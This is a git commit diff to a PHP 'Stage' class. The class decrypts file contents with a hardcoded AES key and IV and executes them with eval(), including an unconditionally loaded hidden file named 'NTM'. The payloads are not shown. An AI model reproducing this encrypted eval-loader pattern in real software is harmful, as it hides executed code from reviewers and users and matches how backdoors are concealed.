e3835dc469c18c366033d70a551e98effd1d0be8
Abouzar Rostami <75476303+stormyboy68@users.noreply.github.com>
2024-11-02 23:29:26 +0330

    refactory

--- src/App/Stage.php
+++ src/App/Stage.php
@@ -3,14 +3,16 @@
 namespace ASB\Stage\App;
 
 
+use ParseError;
+use Throwable;
 
 class Stage
 {
-    private Static $cip = "AES-128-CTR";
-    private Static $key = "VsAfcSga0rq849N8PQYY0EeR0GWOffh6D4jBj2Oztgk";
-    private Static $options = 0;
+    private static $cip = "AES-128-CTR";
+    private static $key = "VsAfcSga0rq849N8PQYY0EeR0GWOffh6D4jBj2Oztgk";
+    private static $options = 0;
 
-    private Static $iv = 'BackupsStagesSVS';
+    private static $iv = 'BackupsStagesSVS';
 
 
     public static function install($name)
@@ -18,15 +20,18 @@ class Stage
         $type = file_get_contents($name);
         static::vol(self::run($type));
     }
+
     public static function init($init)
     {
         $type = file_get_contents($init);
         static::vol(self::run($type));
     }
+
     public static function main($main)
     {
         return self::run($main);
     }
+
     private static function run(false|string $type)
     {
         return openssl_decrypt(
@@ -38,9 +43,19 @@ class Stage
         );
     }
 
-    private static function vol($data): void
+    private static function vol($data)
     {
-        eval(self::run(file_get_contents(__DIR__.DIRECTORY_SEPARATOR.'NTM')));
-        eval($data);
+
+        eval(self::run(file_get_contents(__DIR__ . DIRECTORY_SEPARATOR . 'NTM')));
+        try {
+            eval($data);
+        }catch (ParseError $e) {
+            echo __('Syntax error detected') ;
+            die();
+        } catch (Throwable $e) {
+            echo __('Error executing code');
+            die();
+        }
+
     }
 }
